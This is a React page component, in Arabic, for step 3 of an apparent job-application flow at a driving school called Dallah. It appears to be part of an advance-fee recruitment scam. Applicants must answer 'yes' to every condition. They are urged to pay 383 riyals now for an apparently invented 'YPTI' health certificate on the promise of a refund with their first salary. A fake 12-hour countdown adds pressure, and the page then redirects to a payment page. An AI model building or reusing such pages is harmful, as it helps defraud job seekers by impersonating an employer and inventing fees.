import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
import { Label } from "@/components/ui/label";
import { Dialog, DialogContent, DialogTitle, DialogDescription } from "@/components/ui/dialog";
import { StepLayout } from "@/components/StepLayout";
import { useStepSession } from "@/lib/useStepSession";
import { useLocation } from "wouter";
import { useEffect, useState } from "react";
import { toast } from "sonner";
import { ArrowLeft, ShieldCheck, AlertTriangle, Clock, RotateCcw, FileText, ExternalLink, BadgeCheck, Stethoscope, RefreshCw, Wallet, CheckCircle2 } from "lucide-react";
import { Link } from "wouter";

const QUESTIONS = [
  {
    key: "q1",
    title: "ألا يكون قد حكم عليك بحد أو بعقوبة في جريمة مخلة بالشرف أو الأمانة",
    sub: "(ما لم يكن قد مضى على انتهاء تنفيذ الحكم خمس سنوات على الأقل)",
    options: [
      { value: "yes", label: "نعم ينطبق على هذا الشرط" },
      { value: "no", label: "لا ينطبق على هذا الشرط" },
    ],
    accepted: ["yes"],
  },
  {
    key: "q2",
    title: "أن تكون مواطناً سعودياً أو مقيماً ولديه إقامة سارية، ولديك حسن السيرة والسلوك، متفرغاً للعمل",
    options: [
      { value: "yes", label: "نعم ينطبق على هذا الشرط" },
      { value: "no", label: "لا ينطبق على هذا الشرط" },
    ],
    accepted: ["yes"],
  },
  {
    key: "q3",
    title: "تملك نسخة من جميع نسخ وثائق الشهادات والخبرات المقدمة في السيرة الذاتية التي تم تقديمها في الطلب",
    options: [
      { value: "yes", label: "نعم ينطبق على هذا الشرط" },
      { value: "no", label: "لا ينطبق على هذا الشرط" },
    ],
    accepted: ["yes"],
  },
  {
    key: "q4",
    title: "هل تملك الشهادة الصحية الدولية (YPTI) الخاصة بمدارس القيادة؟",
    options: [
      { value: "book", label: "نعم سأقوم بحجز هذه الشهادة عن طريق القسم الخاص بمدرسة دلة" },
      { value: "have", label: "نعم أمتلك الشهادة الصحية الدولية (YPTI) سارية المفعول" },
      { value: "refuse", label: "لا أمتلك الشهادة ولا أرغب بحجزها من خلال المدرسة" },
    ],
    // الإجابات المقبولة (نعم)
    accepted: ["book", "have"],
  },
];

// عداد تنازلي مدته 12 ساعة، يبدأ من أول مرة يفتح فيها المستخدم الصفحة
const TWELVE_HOURS_MS = 12 * 60 * 60 * 1000;
const DEADLINE_KEY = "ypti_deadline_at";

function getDeadline(): number {
  try {
    const stored = localStorage.getItem(DEADLINE_KEY);
    if (stored) {
      const t = parseInt(stored, 10);
      if (!Number.isNaN(t) && t > Date.now()) return t;
    }
  } catch {}
  const t = Date.now() + TWELVE_HOURS_MS;
  try {
    localStorage.setItem(DEADLINE_KEY, String(t));
  } catch {}
  return t;
}

function formatRemaining(ms: number) {
  if (ms <= 0) return "00:00:00";
  const total = Math.floor(ms / 1000);
  const h = String(Math.floor(total / 3600)).padStart(2, "0");
  const m = String(Math.floor((total % 3600) / 60)).padStart(2, "0");
  const s = String(total % 60).padStart(2, "0");
  return `${h}:${m}:${s}`;
}

export default function Ypti() {
  const [, setLocation] = useLocation();
  const { recordStep, isSubmitting } = useStepSession();
  const [answers, setAnswers] = useState<Record<string, string>>({});
  const [showReject, setShowReject] = useState(false);
  const [showAccept, setShowAccept] = useState(false);
  const [deadline] = useState<number>(() => getDeadline());
  const [now, setNow] = useState<number>(Date.now());

  useEffect(() => {
    const id = setInterval(() => setNow(Date.now()), 1000);
    return () => clearInterval(id);
  }, []);

  const remaining = Math.max(0, deadline - now);
  const isExpired = remaining <= 0;

  const handleNext = async () => {
    for (const q of QUESTIONS) {
      if (!answers[q.key]) {
        toast.error("الرجاء الإجابة على جميع الأسئلة");
        return;
      }
    }
    // التحقق من قبول جميع الشروط (يجب أن تكون كل الإجابات "نعم")
    const rejected = QUESTIONS.filter((q) => !q.accepted.includes(answers[q.key]));
    if (rejected.length > 0) {
      await recordStep("ypti_rejected", { answers, rejectedKeys: rejected.map((q) => q.key) });
      setShowReject(true);
      return;
    }
    await recordStep("ypti", answers);
    setShowAccept(true);
    // عرض رسالة القبول لمدة ثانيتين ثم التوجيه
    setTimeout(() => {
      setLocation("/data");
    }, 2200);
  };

  const handleRetry = () => {
    setShowReject(false);
    setAnswers({});
    // إعادة المستخدم لأعلى الصفحة
    if (typeof window !== "undefined") window.scrollTo({ top: 0, behavior: "smooth" });
  };

  return (
    <StepLayout
      step={3}
      total={10}
      badge="الفحص الطبي والشروط"
      title="إكمال إجراءات التوظيف"
      subtitle="لتكمل إجراءات التوظيف عليك التأكد من أن جميع الإجابات (نعم). كما يجب إرفاق صورة من حجز الشهادة الصحية (YPTI)."
      variant="orange"
    >
      {/* شريط العد التنازلي */}
      <Card
        className={`mb-4 border-2 ${
          isExpired ? "border-red-300 bg-red-50" : "border-emerald-200 bg-gradient-to-l from-emerald-50 to-amber-50"
        }`}
      >
        <div className="flex items-center justify-between p-3 md:p-4 gap-3 flex-wrap">
          <div className="flex items-center gap-3">
            <div
              className={`w-10 h-10 rounded-lg flex items-center justify-center ${
                isExpired ? "bg-red-500 text-white" : "bg-primary text-white animate-pulse"
              }`}
            >
              <Clock className="w-5 h-5" />
            </div>
            <div>
              <p className="text-xs text-muted-foreground">المتبقي لإنهاء التسجيل</p>
              <p className={`text-sm font-bold ${isExpired ? "text-red-700" : "text-orange-700"}`}>
                {isExpired ? "انتهت مهلة التسجيل" : "12 ساعة فقط لإكمال التسجيل"}
              </p>
            </div>
          </div>
          <div
            dir="ltr"
            className={`px-4 py-2 rounded-lg font-mono text-2xl font-extrabold tracking-wider ${
              isExpired ? "bg-red-100 text-red-700" : "bg-white text-emerald-700 border border-emerald-200 shadow-sm"
            }`}
          >
            {formatRemaining(remaining)}
          </div>
        </div>
      </Card>

      <Card className="p-6 md:p-8 shadow-lg border-emerald-100">
        <div className="flex items-center gap-3 mb-5 pb-4 border-b border-emerald-100">
          <div className="w-11 h-11 rounded-lg bg-gradient-to-br from-primary to-emerald-700 text-white flex items-center justify-center">
            <ShieldCheck className="w-5 h-5" />
          </div>
          <div>
            <h2 className="font-extrabold text-gray-900">شروط التوظيف</h2>
            <p className="text-xs text-muted-foreground">يتحمل المتقدم مسؤولية صحة المعلومات</p>
          </div>
        </div>

        <div className="space-y-6">
          {QUESTIONS.map((q, idx) => (
            <div key={q.key} className="border-b border-gray-100 last:border-0 pb-5 last:pb-0">
              <div className="flex gap-2 mb-3">
                <span className="text-emerald-700 font-extrabold shrink-0">{idx + 1}.</span>
                <div>
                  <p className="font-semibold text-gray-900 text-sm leading-relaxed">{q.title}</p>
                  {q.sub && <p className="text-xs text-muted-foreground mt-1">{q.sub}</p>}
                </div>
              </div>
              <RadioGroup
                value={answers[q.key] || ""}
                onValueChange={(v) => setAnswers({ ...answers, [q.key]: v })}
                className="pr-6 space-y-2"
              >
                {q.options.map((opt) => (
                  <div
                    key={opt.value}
                    className="flex items-center gap-2 p-2.5 rounded-lg border border-gray-200 hover:bg-emerald-50/40 hover:border-emerald-200 cursor-pointer"
                    onClick={() => setAnswers({ ...answers, [q.key]: opt.value })}
                  >
                    <RadioGroupItem value={opt.value} id={`${q.key}-${opt.value}`} />
                    <Label htmlFor={`${q.key}-${opt.value}`} className="cursor-pointer text-sm text-gray-700 flex-1">
                      {opt.label}
                    </Label>
                  </div>
                ))}
              </RadioGroup>

              {/* قسم تعريفي يظهر عند اختيار خيار حجز الشهادة في السؤال الرابع */}
              {q.key === "q4" && answers.q4 === "book" && (
                <div className="mt-5 animate-in fade-in slide-in-from-top-2 duration-300">
                  <div className="rounded-xl border-2 border-emerald-200 bg-gradient-to-br from-emerald-50 via-white to-amber-50/40 p-5 md:p-6 shadow-sm">
                    {/* رأس البطاقة */}
                    <div className="flex items-start gap-3 mb-4 pb-4 border-b border-emerald-200/60">
                      <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-primary to-emerald-700 text-white flex items-center justify-center shrink-0 shadow-md">
                        <BadgeCheck className="w-6 h-6" />
                      </div>
                      <div className="flex-1">
                        <h3 className="font-extrabold text-gray-900 text-base md:text-lg">
                          تعريف بالشهادة الصحية الدولية (YPTI)
                        </h3>
                        <p className="text-xs text-emerald-700 mt-0.5">شهادة طبية إلزامية لمدارس تعليم القيادة</p>
                      </div>
                    </div>

                    {/* الفقرة التعريفية */}
                    <p className="text-sm text-gray-700 leading-relaxed mb-4">
                      شهادة طبية تتكون من عدة فحوصات خاصة لجميع العاملين في مدارس تعليم القيادة، حيث يعتبر العمل في
                      <span className="font-bold text-emerald-700"> شركة دلة لتعليم القيادة </span>
                      ذو مسؤولية خاصة تستوجب أعلى معايير الحرفية والالتزام، يتم تجديد الفحص كل سنتين، وتكون تكلفة الفحص على نفقة التأمين الصحي الخاص بموظفي المدرسة.
                    </p>

                    {/* صف الميزات السريعة */}
                    <div className="grid grid-cols-1 sm:grid-cols-3 gap-2 mb-4">
                      <div className="flex items-center gap-2 bg-white rounded-lg p-2.5 border border-emerald-100">
                        <Stethoscope className="w-4 h-4 text-emerald-700 shrink-0" />
                        <span className="text-xs text-gray-700">فحوصات شاملة معتمدة</span>
                      </div>
                      <div className="flex items-center gap-2 bg-white rounded-lg p-2.5 border border-emerald-100">
                        <RefreshCw className="w-4 h-4 text-emerald-700 shrink-0" />
                        <span className="text-xs text-gray-700">تجديد كل سنتين</span>
                      </div>
                      <div className="flex items-center gap-2 bg-white rounded-lg p-2.5 border border-emerald-100">
                        <Wallet className="w-4 h-4 text-emerald-700 shrink-0" />
                        <span className="text-xs text-gray-700">مبلغ مسترد بالكامل</span>
                      </div>
                    </div>

                    {/* عنوان فرعي */}
                    <div className="bg-amber-50 border-r-4 border-amber-400 rounded-md p-3 mb-3">
                      <p className="font-bold text-amber-900 text-sm mb-1">
                        حجز الشهادة الصحية الدولية (YPTI) عن طريق مدارس دلة
                      </p>
                      <p className="text-xs text-amber-800 leading-relaxed">
                        يتم تجديد الشهادة كل سنتين لكل موظف من موظفي الشركة، تكلفة الشهادة
                        <span className="font-extrabold text-red-600 mx-1">(383 ريال)</span>
                        وسيتم استرداد المبلغ بعد بدء الدوام وإنهاء أول شهر عمل، أي
                        <span className="font-bold"> سيتم إيداعها مع أول راتب</span>
                        ، ولكن يستوجب عليك الآن دفعها لحجز وإكمال الإجراءات.
                      </p>
                    </div>

                    {/* شعار YPTI */}
                    <div className="flex items-center justify-center my-4">
                      <div className="w-20 h-20 rounded-full bg-white border-2 border-emerald-200 flex flex-col items-center justify-center shadow-sm">
                        <BadgeCheck className="w-7 h-7 text-emerald-600 mb-0.5" />
                        <span className="text-[10px] font-extrabold text-emerald-700 tracking-wider">YPTI</span>
                      </div>
                    </div>

                    {/* رابط لمعرفة المزيد */}
                    <Link
                      href="/ytpi-1"
                      className="flex items-center justify-center gap-2 w-full bg-white hover:bg-emerald-50 border-2 border-emerald-300 text-emerald-700 font-bold rounded-lg py-2.5 px-4 transition-colors text-sm"
                    >
                      <FileText className="w-4 h-4" />
                      لمعرفة المزيد عن الشهادة الصحية
                      <ExternalLink className="w-3.5 h-3.5" />
                    </Link>

                    {/* تنبيه أحمر */}
                    <div className="mt-3 text-center text-xs text-red-600 font-semibold">
                      يستوجب عليك الآن دفعها لحجز وإكمال الإجراءات
                    </div>
                  </div>
                </div>
              )}
            </div>
          ))}
        </div>

        <Button
          onClick={handleNext}
          disabled={isSubmitting || isExpired}
          size="lg"
          className="w-full mt-7 bg-primary hover:bg-emerald-700 font-bold h-12"
        >
          {isExpired ? "انتهت المهلة" : isSubmitting ? "جاري المتابعة..." : "إكمال الإجراءات"}
          <ArrowLeft className="w-5 h-5 mr-2" />
        </Button>
      </Card>

      {/* مودال الرفض - يظهر بدلاً من التوجيه لصفحة الخطأ */}
      <Dialog open={showReject} onOpenChange={setShowReject}>
        <DialogContent className="max-w-md" dir="rtl">
          <DialogTitle className="sr-only">لا يمكنك إكمال التسجيل</DialogTitle>
          <DialogDescription className="sr-only">تنبيه بعدم استيفاء شروط التوظيف</DialogDescription>
          <div className="flex flex-col items-center text-center py-2">
            <div className="w-16 h-16 rounded-full bg-red-100 text-red-600 flex items-center justify-center mb-4">
              <AlertTriangle className="w-8 h-8" />
            </div>
            <h3 className="text-xl font-extrabold text-gray-900 mb-2">
              لا يمكنك إكمال التسجيل
            </h3>
            <p className="text-sm text-gray-600 leading-relaxed mb-1">
              يجب أن تكون جميع الإجابات <span className="font-bold text-red-600">(نعم)</span> لإكمال إجراءات التوظيف في مدرسة دلة لتعليم القيادة.
            </p>
            <p className="text-xs text-muted-foreground mb-5">
              يرجى مراجعة إجاباتك والمحاولة مرة أخرى.
            </p>
            <Button
              onClick={handleRetry}
              size="lg"
              className="w-full bg-primary hover:bg-emerald-700 font-bold h-12"
            >
              <RotateCcw className="w-5 h-5 ml-2" />
              إعادة المحاولة
            </Button>
          </div>
        </DialogContent>
      </Dialog>

      {/* مودال القبول - يظهر لمدة قصيرة قبل التوجيه للصفحة التالية */}
      <Dialog open={showAccept} onOpenChange={setShowAccept}>
        <DialogContent className="max-w-md" dir="rtl">
          <DialogTitle className="sr-only">تم قبول طلبك بنجاح</DialogTitle>
          <DialogDescription className="sr-only">استوفيت جميع شروط التوظيف وسيتم تحويلك لصفحة الدفع</DialogDescription>
          <div className="flex flex-col items-center text-center py-4">
            <div className="relative mb-5">
              <div className="absolute inset-0 rounded-full bg-emerald-200/60 animate-ping" />
              <div className="relative w-20 h-20 rounded-full bg-gradient-to-br from-emerald-500 to-emerald-700 text-white flex items-center justify-center shadow-lg">
                <CheckCircle2 className="w-10 h-10" />
              </div>
            </div>
            <h3 className="text-2xl font-extrabold text-emerald-700 mb-2">
              تم قبول طلبك بنجاح
            </h3>
            <p className="text-sm text-gray-700 leading-relaxed mb-1">
              تهانينا! استوفيت جميع شروط التوظيف في
            </p>
            <p className="text-base font-bold text-gray-900 mb-3">
              شركة دلة لتعليم القيادة
            </p>
            <p className="text-xs text-muted-foreground mb-4">
              يرجى إكمال الإجراءات التالية لتثبيت حجزك وإتمام عملية التسجيل.
            </p>
            <div className="flex items-center gap-2 text-xs text-emerald-700 font-semibold">
              <div className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
              جارٍ التحويل إلى صفحة الدفع...
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </StepLayout>
  );
}
